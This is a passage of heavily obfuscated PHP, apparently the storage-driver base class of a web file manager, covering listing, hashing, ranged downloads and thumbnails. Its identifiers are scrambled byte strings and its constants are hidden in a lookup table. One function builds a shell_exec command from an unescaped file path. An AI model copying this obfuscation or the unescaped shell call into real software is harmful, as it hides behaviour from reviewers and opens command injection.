delFolder($ˆ…âİ¬¥) { } public function copyFile($¨ûò°¶é, $±©Áú’ˆ) { } public function moveFile($óÒ¬¢¹ú, $¬ÁËÏ—”) { } public function remove($½ß‚‚ì…) { if ($this->isFile($½ß‚‚ì…)) { return $this->delFile($½ß‚‚ì…); } return $this->delFolder($½ß‚‚ì…); } public function rename($€‹å¥ˆ¡, $¡ƒ­ÚÍ’) { } public function exist($Úşã‡¨) { } public function findByHash($íÏùµØ = '', $¡§æ”õ = '') { return !1; } public function isFile($ˆÑš©ğÏ) { } public function isFolder($ÇÄ¬èÛƒ) { } public function size($áÃâõÜ½) { } public function info($Ã­Ä¸ƒ¢) { } public function infoSimple($¤Ü—‘ô) { return $this->info($¤Ü—‘ô); } public function infoAuth($ĞúÛÃåú) { return $this->info($ĞúÛÃåú); } public function infoFull($ë»µóí) { return $this->info($ë»µóí); } public function infoFullSimple($İºÀØÎ) { return $this->info($İºÀØÎ); } public function infoWithChildren($»İã¿³À) { $ŠÂ°ÉÛ =& $_SERVER[•€áå–Õ]; static $ğÕÖ¿õ² = array(); if (isset($ğÕÖ¿õ²[$»İã¿³À])) { return $ğÕÖ¿õ²[$»İã¿³À]; } $äæİ°Ã½ = $this->info($»İã¿³À); if ($äæİ°Ã½ && $äæİ°Ã½[$ŠÂ°ÉÛ[43]] == $ŠÂ°ÉÛ[87]) { $ãë‰–Á = array($ŠÂ°ÉÛ[88] => 0, $ŠÂ°ÉÛ[89] => 0, $ŠÂ°ÉÛ[90] => 0); $this->infoChildren($»İã¿³À, $ãë‰–Á); $äæİ°Ã½[$ŠÂ°ÉÛ[88]] = $ãë‰–Á[$ŠÂ°ÉÛ[88]]; $äæİ°Ã½[$ŠÂ°ÉÛ[91]] = array($ŠÂ°ÉÛ[92] => $ãë‰–Á[$ŠÂ°ÉÛ[89]], $ŠÂ°ÉÛ[93] => $ãë‰–Á[$ŠÂ°ÉÛ[90]]); $ğÕÖ¿õ²[$»İã¿³À] = $äæİ°Ã½; } return $äæİ°Ã½; } public function listPath($Ú‹ñ–“£, $„ÉŸ¸ä™ = false) { } public function has($•Ş«ïÂğ, $×µù×§² = false, $†à§ùáµ = false) { } public function canRead($ÄåÀ†£’) { } public function canWrite($Ó Àò) { } public function getContent($­í¦º») { } public function setContent($ç×İèâÑ, $Ì´Ëàè½ = '') { } protected function infoChildren($·ášÎ„ñ, &$……âÏš„) { $ë¤áË³¸ =& $_SERVER[•€áå–Õ]; check_abort_echo(); $¡Ğ÷ÌİÊ = $this->listPath($·ášÎ„ñ, !0); $¡Ğ÷ÌİÊ = array_merge($¡Ğ÷ÌİÊ[$ë¤áË³¸[94]], $¡Ğ÷ÌİÊ[$ë¤áË³¸[95]]); foreach ($¡Ğ÷ÌİÊ as $Àè²ßøÏ) { if ($Àè²ßøÏ[$ë¤áË³¸[43]] == $ë¤áË³¸[87]) { $……âÏš„[$ë¤áË³¸[90]]++; $ÏõÉÊÈ³ = $this->getPathInner($Àè²ßøÏ[$ë¤áË³¸[96]]); $this->infoChildren($ÏõÉÊÈ³, $……âÏš„); } else { $……âÏš„[$ë¤áË³¸[89]]++; $……âÏš„[$ë¤áË³¸[88]] += $Àè²ßøÏ[$ë¤áË³¸[88]]; } } } public function fileSubstr($Š»¢ñø¯, $“´Œ¯Í, $®ÙŸË¬°) { } public function listAll($‰Œ­ òö) { } public function listAllMake($Ÿ®ê™Ù, &$Ôø¥çÙ) { $ğ’‡‡Ş =& $_SERVER[•€áå–Õ]; check_abort_echo(); $Ø´êè¹ñ = $this->listPath($Ÿ®ê™Ù, !0); if (!$Ø´êè¹ñ) { return; } $ Œß“ª = array_merge($Ø´êè¹ñ[$ğ’‡‡Ş[94]], $Ø´êè¹ñ[$ğ’‡‡Ş[95]]); foreach ($ Œß“ª as $ªï“û­¥) { $ô°”ËŸå = $ªï“û­¥[$ğ’‡‡Ş[43]] == $ğ’‡‡Ş[87]; $ú‹ãÕïŠ = array($ğ’‡‡Ş[96] => $ªï“û­¥[$ğ’‡‡Ş[96]], $ğ’‡‡Ş[87] => $ô°”ËŸå); if (isset($ªï“û­¥[$ğ’‡‡Ş[88]])) { $ú‹ãÕïŠ[$ğ’‡‡Ş[88]] = $ªï“û­¥[$ğ’‡‡Ş[88]]; } if (isset($ªï“û­¥[$ğ’‡‡Ş[97]])) { $ú‹ãÕïŠ[$ğ’‡‡Ş[97]] = $ªï“û­¥[$ğ’‡‡Ş[97]]; } if (!$ô°”ËŸå) { $Ôø¥çÙ[] = $ú‹ãÕïŠ; continue; } $Ôø¥çÙ[] = $ú‹ãÕïŠ; $‹»±ƒ´‰ = $ªï“û­¥[$ğ’‡‡Ş[96]]; $ãÉÔ€Ò = $this->pathDriver; if (substr($ªï“û­¥[$ğ’‡‡Ş[96]], 0, strlen($ãÉÔ€Ò)) == $ãÉÔ€Ò) { $‹»±ƒ´‰ = substr($‹»±ƒ´‰, strlen($ãÉÔ€Ò)); } $this->listAllMake($‹»±ƒ´‰, $Ôø¥çÙ); } } public function listAllSimple($ ÓŞ“®, $Äõ£®¾ş = false) { $ÑøÓöé™ = $this->listAll($ ÓŞ“®); return $this->listAllSimpleMake($ÑøÓöé™, $this->getPathOuter($ ÓŞ“®), $Äõ£®¾ş); } public function listAllSimpleMake($ı§¤à—, $¤±†ò¯Ò, $—ÂËÔÃ†) { $÷£©Æ¡¹ =& $_SERVER[•€áå–Õ]; $ûÕÏĞÇÎ = array(); $¤±†ò¯Ò = rtrim(get_path_father($¤±†ò¯Ò), $÷£©Æ¡¹[18]) . $÷£©Æ¡¹[18]; foreach ($ı§¤à— as $ıõùö•) { $îÎê“¬ = array($÷£©Æ¡¹[96] => $ıõùö•[$÷£©Æ¡¹[96]], $÷£©Æ¡¹[98] => $ıõùö•[$÷£©Æ¡¹[96]], $÷£©Æ¡¹[87] => $ıõùö•[$÷£©Æ¡¹[87]]); if (isset($ıõùö•[$÷£©Æ¡¹[88]]) && !$ıõùö•[$÷£©Æ¡¹[87]]) { $îÎê“¬[$÷£©Æ¡¹[88]] = $ıõùö•[$÷£©Æ¡¹[88]]; } if (isset($ıõùö•[$÷£©Æ¡¹[97]])) { $îÎê“¬[$÷£©Æ¡¹[97]] = $ıõùö•[$÷£©Æ¡¹[97]]; } if (is_array($ıõùö•[$÷£©Æ¡¹[99]])) { $îÎê“¬[$÷£©Æ¡¹[98]] = $ıõùö•[$÷£©Æ¡¹[99]][$÷£©Æ¡¹[96]]; $îÎê“¬[$÷£©Æ¡¹[88]] = $ıõùö•[$÷£©Æ¡¹[99]][$÷£©Æ¡¹[88]]; $îÎê“¬[$÷£©Æ¡¹[97]] = $ıõùö•[$÷£©Æ¡¹[99]][$÷£©Æ¡¹[97]]; } else { if (substr($ıõùö•[$÷£©Æ¡¹[96]], 0, strlen($¤±†ò¯Ò)) == $¤±†ò¯Ò) { $îÎê“¬[$÷£©Æ¡¹[96]] = substr($ıõùö•[$÷£©Æ¡¹[96]], strlen($¤±†ò¯Ò)); } } $£Á‚½ç­ = $ıõùö•[$÷£©Æ¡¹[87]] ? $÷£©Æ¡¹[18] : $÷£©Æ¡¹[22]; $îÎê“¬[$÷£©Æ¡¹[98]] = rtrim($îÎê“¬[$÷£©Æ¡¹[98]], $÷£©Æ¡¹[18]) . $£Á‚½ç­; $îÎê“¬[$÷£©Æ¡¹[96]] = $÷£©Æ¡¹[18] . trim($îÎê“¬[$÷£©Æ¡¹[96]], $÷£©Æ¡¹[18]) . $£Á‚½ç­; if (!$—ÂËÔÃ†) { $È‡îÒı­ = explode($÷£©Æ¡¹[18], trim($îÎê“¬[$÷£©Æ¡¹[96]], $÷£©Æ¡¹[18])); $îÎê“¬[$÷£©Æ¡¹[96]] = $÷£©Æ¡¹[18] . implode($÷£©Æ¡¹[18], array_slice($È‡îÒı­, 1)) . $£Á‚½ç­; } $ûÕÏĞÇÎ[] = $îÎê“¬; } return array_sort_by($ûÕÏĞÇÎ, $÷£©Æ¡¹[96]); } public function upload($ÕÆ¯îÁş, $ƒÛğß, $‹¬• ¹° = false, $«…¼ö = REPEAT_REPLACE) { } public function uploadFileByID($€ºÃŠèê, $öÎôÓ˜Õ, $€äÑÉ’) { } public function uploadFileByPath($¦ç‡³Š›, $š’¿™Ú«, $´•–úæ¡ = array()) { } public function isUploadServer() { $ÃÑ²´× =& $_SERVER[•€áå–Õ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÃÑ²´×[100]) { return !0; } return $GLOBALS[$ÃÑ²´×[16]][$ÃÑ²´×[101]][$ÃÑ²´×[102]]; } public function isFileOutServer() { $äˆ§ÀÕ =& $_SERVER[•€áå–Õ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $äˆ§ÀÕ[100]) { return !0; } return $GLOBALS[$äˆ§ÀÕ[16]][$äˆ§ÀÕ[101]][$äˆ§ÀÕ[103]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ëÕ›ÉçÀ) { $Ú¨¯Ë½ı =& $_SERVER[•€áå–Õ]; if (!$this->isCdnHost()) { return $ëÕ›ÉçÀ; } return str_replace(trim(get_url_root($ëÕ›ÉçÀ), $Ú¨¯Ë½ı[18]), trim($this->cdnHost, $Ú¨¯Ë½ı[18]), $ëÕ›ÉçÀ); } public function uploadLink($„ğ¹Øç·, $…£ëŒ­ = 0) { $ÂÙ‰£¦ï =& $_SERVER[•€áå–Õ]; if ($this->isUploadServer()) { return; } $ÖšÙç×î = $this->getType(); if (!in_array($ÖšÙç×î, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÀîÂ»Œœ = 1024 * 1024 * 10; $ê”ˆ²Å„ = $…£ëŒ­ <= $ÀîÂ»Œœ ? $ÂÙ‰£¦ï[104] : $ÂÙ‰£¦ï[105]; $Îìêæ³ = (!$…£ëŒ­ ? 1 : ceil($…£ëŒ­ / pow(1024, 3))) * 3600 * 4; $¶´ş¼‡ = $this->{$ê”ˆ²Å„}($„ğ¹Øç·, $Îìêæ³); if ($¶´ş¼‡) { $¶´ş¼‡[$ÂÙ‰£¦ï[106]] = $„ğ¹Øç·; $¶´ş¼‡[$ÂÙ‰£¦ï[107]] = $ÖšÙç×î; } return $¶´ş¼‡; } public function uploadFormData($íïùîÎì, $Ú‹‹±öÖ = 3600) { } public function multiUploadFormData($¥Äü¡÷, $ Á¾Œ = 3600) { } public function download($ùÁø‘¡ , $Å‘€æÄ) { } public function ext($Åá™şÍ) { $‰à÷©•³ =& $_SERVER[•€áå–Õ]; if (strpos($Åá™şÍ, $‰à÷©•³[18]) === -1) { $Õ‹ÚÆô = $Åá™şÍ; } else { $Õ‹ÚÆô = $this->pathThis($Åá™şÍ); } $™¹ïÊ”¬ = $‰à÷©•³[22]; if (strstr($Õ‹ÚÆô, $‰à÷©•³[20])) { $™¹ïÊ”¬ = substr($Õ‹ÚÆô, strrpos($Õ‹ÚÆô, $‰à÷©•³[20]) + 1); $™¹ïÊ”¬ = strtolower($™¹ïÊ”¬); } if (strlen($™¹ïÊ”¬) > 3 && preg_match($‰à÷©•³[108], $™¹ïÊ”¬, $‘‰ƒíÙ€)) { $™¹ïÊ”¬ = $‰à÷©•³[22]; } return $™¹ïÊ”¬; } public function pathThis($ÑôÏè×¾) { $áãğŸ =& $_SERVER[•€áå–Õ]; $ÑôÏè×¾ = str_replace($áãğŸ[109], $áãğŸ[18], rtrim($ÑôÏè×¾, $áãğŸ[18])); $‚ò«ÍÁ = strrpos($ÑôÏè×¾, $áãğŸ[18]); if ($‚ò«ÍÁ === !1) { return $ÑôÏè×¾; } return substr($ÑôÏè×¾, $‚ò«ÍÁ + 1); } public function pathFather($ù‡ıåÄÙ) { $­å´’­ =& $_SERVER[•€áå–Õ]; $ù‡ıåÄÙ = str_replace($­å´’­[109], $­å´’­[18], rtrim($ù‡ıåÄÙ, $­å´’­[18])); $Õ„É÷Ğê = strrpos($ù‡ıåÄÙ, $­å´’­[18]); if ($Õ„É÷Ğê === !1) { return $­å´’­[22]; } return substr($ù‡ıåÄÙ, 0, $Õ„É÷Ğê + 1); } public function hashSimple($ûÂ¸ÄÈØ) { $ Æ´¨ù =& $_SERVER[•€áå–Õ]; if (!$ûÂ¸ÄÈØ) { return md5($ Æ´¨ù[22]); } $·²ÏŸğ = $this->size($ûÂ¸ÄÈØ); $İôµ¦é = 200; $Äêã‰”Å = 50; if ($·²ÏŸğ <= $İôµ¦é * $Äêã‰”Å) { return $this->hashMd5($ûÂ¸ÄÈØ) . $·²ÏŸğ; } $«—ÆÍ§ = intval($·²ÏŸğ / $Äêã‰”Å); $éî¢õ”è = $ Æ´¨ù[22]; for ($·×ö´ŠÈ = 0; $·×ö´ŠÈ < $Äêã‰”Å; $·×ö´ŠÈ++) { $éî¢õ”è .= $this->fileSubstr($ûÂ¸ÄÈØ, $«—ÆÍ§ * $·×ö´ŠÈ, $İôµ¦é); } $éî¢õ”è .= $this->fileSubstr($ûÂ¸ÄÈØ, $·²ÏŸğ - $İôµ¦é, $İôµ¦é); return md5($éî¢õ”è) . $·²ÏŸğ; } public static $md5Cache = array(); public function hashMd5($Í’ï­¶•) { if (!$Í’ï­¶•) { return md5($_SERVER[•€áå–Õ][22]); } $Í’ï­¶• = $this->iconvSystem($Í’ï­¶•); if (isset(self::$md5Cache[$Í’ï­¶•])) { return self::$md5Cache[$Í’ï­¶•]; } self::$md5Cache[$Í’ï­¶•] = $this->hashMd5Shell($Í’ï­¶•); if (!self::$md5Cache[$Í’ï­¶•]) { self::$md5Cache[$Í’ï­¶•] = @md5_file($Í’ï­¶•); } return self::$md5Cache[$Í’ï­¶•]; } private function hashMd5Shell($ÈÉ¢ß®˜) { $û½×“Ìğ =& $_SERVER[•€áå–Õ]; if (!$ÈÉ¢ß®˜) { return md5($û½×“Ìğ[22]); } if (!function_exists($û½×“Ìğ[110])) { return !1; } $‡—¥™ = array($û½×“Ìğ[111], $û½×“Ìğ[112]); $¹¼ä¶óâ = Cache::get($û½×“Ìğ[113]); if (!$¹¼ä¶óâ) { $ıÇÄÆß = BASIC_PATH . $û½×“Ìğ[114]; $À«ó¦÷Ó = md5_file($ıÇÄÆß); $¹¼ä¶óâ = $û½×“Ìğ[115]; foreach ($‡—¥™ as $ê“´Ñ•†) { $¶ÈÄöá© = shell_exec($ê“´Ñ•† . "\40\42{$ıÇÄÆß}\42"); if ($¶ÈÄöá© && substr(trim($¶ÈÄöá©), 0, 32) == $À«ó¦÷Ó) { $¹¼ä¶óâ = $ê“´Ñ•†; break; } } Cache::set($û½×“Ìğ[113], $¹¼ä¶óâ, 3600); } if ($¹¼ä¶óâ == $û½×“Ìğ[115]) { return !1; } $¶ÈÄöá© = shell_exec($¹¼ä¶óâ . "\40\x22{$ÈÉ¢ß®˜}\42"); $¶ÈÄöá© = str_replace($û½×“Ìğ[116], $û½×“Ìğ[22], $¶ÈÄöá©); return substr($¶ÈÄöá©, 0, 32); } public function link($Ì´Ş‰—ó) { return $Ì´Ş‰—ó; } public function fileOut($ä™¯ªá”, $‚áóÙÉ¸ = false, $Ÿ‰ÈÇ˜  = false, $õ÷µîæ = '') { $ôüÙÂÖ— =& $_SERVER[•€áå–Õ]; $this->cacheMethod(null, null); if (!$ä™¯ªá” || !$this->exist($ä™¯ªá”)) { show_json(LNG($ôüÙÂÖ—[117]), !1, $Ÿ‰ÈÇ˜ ); } $¯ºöì² = $this->getType() == $ôüÙÂÖ—[118]; $×ÄüÚØ” = $GLOBALS[$ôüÙÂÖ—[16]][$ôüÙÂÖ—[101]][$ôüÙÂÖ—[119]][$ôüÙÂÖ—[120]]; $Ôõ’êÃš = (double) $GLOBALS[$ôüÙÂÖ—[16]][$ôüÙÂÖ—[101]][$ôüÙÂÖ—[119]][$ôüÙÂÖ—[121]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÑÛ¾¸· = $this->infoFull($ä™¯ªá”); $ÎÕïÏÌ› = $ÑÛ¾¸·[$ôüÙÂÖ—[88]]; $¬ûª÷Ü = gmdate($ôüÙÂÖ—[122], $ÑÛ¾¸·[$ôüÙÂÖ—[97]]); $ÍªÜí¸™ = $Ÿ‰ÈÇ˜  ? $Ÿ‰ÈÇ˜  : $this->iconvApp($ÑÛ¾¸·[$ôüÙÂÖ—[42]]); $ÏŞˆŸ¹ö = 0; $Å’ÚÂÏÕ = $ÎÕïÏÌ› - 1; $¬Ñ¦Ğ¥¦ = $this->ext($ÍªÜí¸™); if (in_array($¬Ñ¦Ğ¥¦, array($ôüÙÂÖ—[123], $ôüÙÂÖ—[124], $ôüÙÂÖ—[125], $ôüÙÂÖ—[126]))) { $¬Ñ¦Ğ¥¦ = $ôüÙÂÖ—[127]; } if (in_array($¬Ñ¦Ğ¥¦, array($ôüÙÂÖ—[128]))) { $¬Ñ¦Ğ¥¦ = $ôüÙÂÖ—[129]; } if (!$õ÷µîæ) { $õ÷µîæ = md5($¬ûª÷Ü . $ÎÕïÏÌ›); } $õ÷µîæ = $ôüÙÂÖ—[130] . $õ÷µîæ . $ôüÙÂÖ—[130]; $×¢ˆÉ‰Õ = get_file_mime($¬Ñ¦Ğ¥¦); $šËÛõ‰ = !0; $šËÛõ‰ = isset($_GET[$ôüÙÂÖ—[131]]) ? !1 : !0; if ($‚áóÙÉ¸ === !1 && !mime_support($×¢ˆÉ‰Õ)) { $×¢ˆÉ‰Õ = $ôüÙÂÖ—[132]; } header($ôüÙÂÖ—[133]); header($ôüÙÂÖ—[134] . $×¢ˆÉ‰Õ); $™¯ºÃØ = rawurlencode($ÍªÜí¸™); $™¯ºÃØ = $ôüÙÂÖ—[130] . $™¯ºÃØ . $ôüÙÂÖ—[135] . $™¯ºÃØ; if ($‚áóÙÉ¸) { header($ôüÙÂÖ—[136]); header($ôüÙÂÖ—[137] . $™¯ºÃØ); } else { if ($šËÛõ‰) { header($ôüÙÂÖ—[138] . $™¯ºÃØ); } } header($ôüÙÂÖ—[139] . gmdate($ôüÙÂÖ—[122], time() + 3600 * 24 * 30) . $ôüÙÂÖ—[140]); header($ôüÙÂÖ—[141]); header($ôüÙÂÖ—[142]); header($ôüÙÂÖ—[143]); if (isset($_SERVER[$ôüÙÂÖ—[144]]) && strtotime($_SERVER[$ôüÙÂÖ—[144]]) == $ÑÛ¾¸·[$ôüÙÂÖ—[97]]) { header($ôüÙÂÖ—[145], !0, 304); die; } if (isset($_SERVER[$ôüÙÂÖ—[146]]) && $_SERVER[$ôüÙÂÖ—[146]] == $õ÷µîæ) { header($ôüÙÂÖ—[147] . $õ÷µîæ, !0, 304); die; } header($ôüÙÂÖ—[147] . $õ÷µîæ); header($ôüÙÂÖ—[148] . $¬ûª÷Ü . $ôüÙÂÖ—[140]); header($ôüÙÂÖ—[149] . $ÍªÜí¸™); header($ôüÙÂÖ—[150]); header($ôüÙÂÖ—[151] . $ÎÕïÏÌ›); header($ôüÙÂÖ—[152]); Hook::trigger($ôüÙÂÖ—[153], $ä™¯ªá”, $ÎÕïÏÌ›, $ÍªÜí¸™, $¬Ñ¦Ğ¥¦); if (!$‚áóÙÉ¸ && $¬Ñ¦Ğ¥¦ == $ôüÙÂÖ—[154]) { if ($ÎÕïÏÌ› > 1024 * 1024 * 5) { die; } $¤¸ø½¦µ = $this->getContent($ä™¯ªá”); $¤¸ø½¦µ = Html::clearSVG($¤¸ø½¦µ); header($ôüÙÂÖ—[155] . strlen($¤¸ø½¦µ)); echo $¤¸ø½¦µ; die; } $âØ‹­òª = strtolower($_SERVER[$ôüÙÂÖ—[156]]); if ($¯ºöì² && $âØ‹­òª && $×ÄüÚØ”) { if (strstr($âØ‹­òª, $ôüÙÂÖ—[157])) { header($ôüÙÂÖ—[158] . $ä™¯ªá”); } else { if (strstr($âØ‹­òª, $ôüÙÂÖ—[159])) { header($ôüÙÂÖ—[160] . $ä™¯ªá”); } else { if (strstr($âØ‹­òª, $ôüÙÂÖ—[161])) { header($ôüÙÂÖ—[162] . $ä™¯ªá”); } } } if ($Ôõ’êÃš) { header($ôüÙÂÖ—[163] . $Ôõ’êÃš); } return; } if (isset($_SERVER[$ôüÙÂÖ—[164]])) { if (preg_match($ôüÙÂÖ—[165], $_SERVER[$ôüÙÂÖ—[164]], $‹÷óî¯)) { $ÏŞˆŸ¹ö = intval($‹÷óî¯[1]); $ÏŞˆŸ¹ö = $ÏŞˆŸ¹ö <= 0 ? 0 : ($ÏŞˆŸ¹ö >= $Å’ÚÂÏÕ ? $Å’ÚÂÏÕ : $ÏŞˆŸ¹ö); if (!empty($‹÷óî¯[2])) { $Ú ÛÛş = intval($‹÷óî¯[2]); $Å’ÚÂÏÕ = $Ú ÛÛş < $ÏŞˆŸ¹ö ? $ÏŞˆŸ¹ö : ($Ú ÛÛş >= $Å’ÚÂÏÕ ? $Å’ÚÂÏÕ : $Ú ÛÛş); } } header($ôüÙÂÖ—[166]); header("\x43\x6f\x6e\164\145\156\164\55\122\141\x6e\147\x65\x3a\x20\x62\171\x74\145\163\x20{$ÏŞˆŸ¹ö}\55{$Å’ÚÂÏÕ}\x2f" . $ÎÕïÏÌ›); } else { header($ôüÙÂÖ—[167]); } header($ôüÙÂÖ—[168]); $Š»‹ş = !0; if ($_SERVER[$ôüÙÂÖ—[169]] == $ôüÙÂÖ—[170] && $ÎÕïÏÌ› > 1204 * 1024 * 1024 * 2) { $Š»‹ş = !1; } if ($Š»‹ş) { header($ôüÙÂÖ—[171] . ($Å’ÚÂÏÕ - $ÏŞˆŸ¹ö + 1)); } if ($_SERVER[$ôüÙÂÖ—[172]] == $ôüÙÂÖ—[173]) { return; } $°şóÓë• = 1024 * 100; $¼éÒƒş = 0; if ($Ôõ’êÃš) { $¼éÒƒş = intval(1000 * 1000 * ($°şóÓë• / $Ôõ’êÃš)); } while ($ÏŞˆŸ¹ö <= $Å’ÚÂÏÕ) { $Òµ‡Ì‹ = timeFloat(); check_abort(); $ğİ”úÙƒ = $Å’ÚÂÏÕ - $ÏŞˆŸ¹ö + 1; if ($ğİ”úÙƒ <= $°şóÓë•) { $°şóÓë• = $ğİ”úÙƒ; } echo $this->fileSubstr($ä™¯ªá”, $ÏŞˆŸ¹ö, $°şóÓë•); $ÏŞˆŸ¹ö += $°şóÓë•; if ($°şóÓë• == $ğİ”úÙƒ) { $ÏŞˆŸ¹ö = $Å’ÚÂÏÕ + 1; } if ($¼éÒƒş) { $ÂŸ£üƒõ = intval(1000 * 1000 * (timeFloat() - $Òµ‡Ì‹)); $¬ˆÔƒ¢– = $¼éÒƒş - $ÂŸ£üƒõ; if ($¬ˆÔƒ¢– > 5) { usleep($¬ˆÔƒ¢–); } } } } public function fileOutServer($Ú¨»¥, $¤íÉœ³ = false, $•ùå€¸  = false, $¢ãÏ·×ë = '') { $this->fileOut($Ú¨»¥, $¤íÉœ³, $•ùå€¸ , $¢ãÏ·×ë); } public function fileOutLink($Èåõìù) { header($_SERVER[•€áå–Õ][174] . $Èåõìù); die; } public function cacheMethod($ª×¬áøÚ, $ã½ÄïÂö, $çä›÷¸ = null) { $óòÎ¥ =& $_SERVER[•€áå–Õ]; static $ê“ŒšÒ = array(); $œ¹ı±™« = $ã½ÄïÂö ? ltrim($this->getPathOuter($ã½ÄïÂö), $óòÎ¥[18]) : $óòÎ¥[22]; $ášÓñ–Œ = $óòÎ¥[175] . $ª×¬áøÚ . $óòÎ¥[176] . rtrim($œ¹ı±™«, $óòÎ¥[18]); if (is_null($ª×¬áøÚ)) { $ê“ŒšÒ = array(); return; } if (is_null($ã½ÄïÂö)) { foreach ($ê“ŒšÒ as $ášÓñ–Œ => $³©Ñ¯é) { if (!strstr($ášÓñ–Œ, $óòÎ¥[175] . $ª×¬áøÚ . $óòÎ¥[177])) { continue; } unset($ê“ŒšÒ[$ášÓñ–Œ]); } return; } if (!is_null($çä›÷¸)) { $ê“ŒšÒ[$ášÓñ–Œ] = $çä›÷¸; return; } $ÀÌ– À¯ = isset($ê“ŒšÒ[$ášÓñ–Œ]) ? $ê“ŒšÒ[$ášÓñ–Œ] : null; if (!is_null($ÀÌ– À¯)) { return $ÀÌ– À¯; } $ÀÌ– À¯ = $this->{$ª×¬áøÚ}($ã½ÄïÂö); $ê“ŒšÒ[$ášÓñ–Œ] = $ÀÌ– À¯; return $ÀÌ– À¯; } public function cacheMethodInfoSet($¼ÛèÂ³, $©€Œ´«é, $Äˆª¯‚Ø = false) { $‡ÂĞ‰€¢ =& $_SERVER[•€áå–Õ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‡ÂĞ‰€¢[178], $¼ÛèÂ³, $©€Œ´«é); $this->cacheMethod($‡ÂĞ‰€¢[179], $¼ÛèÂ³, $©€Œ´«é ? !1 : !0); if (is_array($Äˆª¯‚Ø)) { $this->cacheMethod($‡ÂĞ‰€¢[180], $¼ÛèÂ³, $Äˆª¯‚Ø); } } public function fileOutImage($¸ùÄµÂÃ, $¨¾æÇœŞ = 250) { $Ë‘ö­ŠÔ =& $_SERVER[•€áå–Õ]; set_timeout(); if (substr($¸ùÄµÂÃ, 0, 4) == $Ë‘ö­ŠÔ[161]) { $this->fileOutLink($¸ùÄµÂÃ); } $à˜ŞºÖ = $this->info($¸ùÄµÂÃ); $º¥¦ÏõÂ = !1; $›¬ÁÅà· = isset($GLOBALS[$Ë‘ö­ŠÔ[181]]) ? $GLOBALS[$Ë‘ö­ŠÔ[181]] : array(); if ($›¬ÁÅà· && $›¬ÁÅà·[$Ë‘ö­ŠÔ[182]] == $à˜ŞºÖ[$Ë‘ö­ŠÔ[96]]) { $à˜ŞºÖ = $›¬ÁÅà·; $×±“¬¢Í = $à˜ŞºÖ[$Ë‘ö­ŠÔ[183]]; if ($×±“¬¢Í && isset($×±“¬¢Í[$Ë‘ö­ŠÔ[184]])) { if ($×±“¬¢Í[$Ë‘ö­ŠÔ[184]] <= $¨¾æÇœŞ && $×±“¬¢Í[$Ë‘ö­ŠÔ[185]] <= $¨¾æÇœŞ) { $º¥¦ÏõÂ = !0; } } } if ($à˜ŞºÖ[$Ë‘ö­ŠÔ[88]] <= 1024 * 50 || $º¥¦ÏõÂ || !function_exists($Ë‘ö­ŠÔ[186]) || $à˜ŞºÖ[$Ë‘ö­ŠÔ[187]] == $Ë‘ö­ŠÔ[188]) { return $this->fileOut($¸ùÄµÂÃ, !1, $à˜ŞºÖ[$Ë‘ö­ŠÔ[42]]); } $†Àãæ±Î = kodIO::hashPath($à˜ŞºÖ); $°çâÛö¸ = "\143\x6f\166\145\x72\x5f{$†Àãæ±Î}\x5f{$¨¾æÇœŞ}\56\x70\x6e\147"; $±ƒî¤ÒÆ = IO_PATH_SYSTEM_TEMP . $Ë‘ö­ŠÔ[189]; $‰ÒÁùüû = IO::infoFullSimple($±ƒî¤ÒÆ); $Öê†µê = $‰ÒÁùüû && is_array($‰ÒÁùüû) ? $‰ÒÁùüû[$Ë‘ö­ŠÔ[96]] : $Ë‘ö­ŠÔ[22]; if (!$Öê†µê) { $Öê†µê = IO::mkdir($±ƒî¤ÒÆ); } if ($à˜ŞºÖ[$Ë‘ö­ŠÔ[190]] == $Ë‘ö­ŠÔ[191] && isset($à˜ŞºÖ[$Ë‘ö­ŠÔ[192]]) && $à˜ŞºÖ[$Ë‘ö­ŠÔ[192]] == kodIO::sourceID($Öê†µê)) { $¶é²éŒŸ = $à˜ŞºÖ[$Ë‘ö­ŠÔ[193]]; if ($¨¾æÇœŞ <= 500) { $Çùˆø÷º = preg_replace($Ë‘ö­ŠÔ[194], $Ë‘ö­ŠÔ[195], $à˜ŞºÖ[$Ë‘ö­ŠÔ[42]]); $¶é²éŒŸ = IO::fileNameExist($Öê†µê, $Çùˆø÷º); } return IO::fileOut(KodIO::make($¶é²éŒŸ), !1, $à˜ŞºÖ[$Ë‘ö­ŠÔ[42]]); } $¥Š„×¾Š = IO::fileNameExist($Öê†µê, $°çâÛö¸); if ($¥Š„×¾Š) { return IO::fileOut(KodIO::make($¥Š„×¾Š), !1, $à˜ŞºÖ[$Ë‘ö­ŠÔ[42]]); } if ($¨¾æÇœŞ > 1000) { $this->makeImageCover($Öê†µê, $¸ùÄµÂÃ, $°çâÛö¸, $¨¾æÇœŞ); $this->makeImageCover($Öê†µê, $¸ùÄµÂÃ, "\143\x6f\x76\x65\x72\137{$†Àãæ±Î}\137\62\65\60\56\x70\x6e\147", 250); $¥Š„×¾Š = IO::fileNameExist($Öê†µê, $°çâÛö¸); if ($¥Š„×¾Š) { return IO::fileOut(KodIO::make($¥Š„×¾Š), !1, $à˜ŞºÖ[$Ë‘ö­ŠÔ[42]]); } die; } $šÍğ» Á = Cache::get($°çâÛö¸); if ($šÍğ» Á == $Ë‘ö­ŠÔ[196] || $šÍğ» Á == $Ë‘ö­ŠÔ[197]) { echo $šÍğ» Á; die; } Cache::set($°çâÛö¸, $Ë‘ö­ŠÔ[197], 60); $½ª¤ŸË’ = array($Öê†µê, $à˜ŞºÖ[$Ë‘ö­ŠÔ[96]], $°çâÛö¸, $¨¾æÇœŞ); $ÍÍ¨ÓÒâ = $Ë‘ö­ŠÔ[198] . $à˜ŞºÖ[$Ë‘ö­ŠÔ[88]] . $Ë‘ö­ŠÔ[199] . $°çâÛö¸ . $Ë‘ö­ŠÔ[200] . $à˜ŞºÖ[$Ë‘ö­ŠÔ[42]] . $Ë‘ö­ŠÔ[201] . $à˜ŞºÖ[$Ë‘ö­ŠÔ[96]]; TaskQueue::add($Ë‘ö­ŠÔ[202], $½ª¤ŸË’, $ÍÍ¨ÓÒâ, $°çâÛö¸); } public function makeImageCover($™™õÔäî, $ÆîÌãó€, $«²Î´‚‰, $‘¥¨‹¿) { $¾õ¶İÀÏ =& $_SERVER[•€áå–Õ]; if 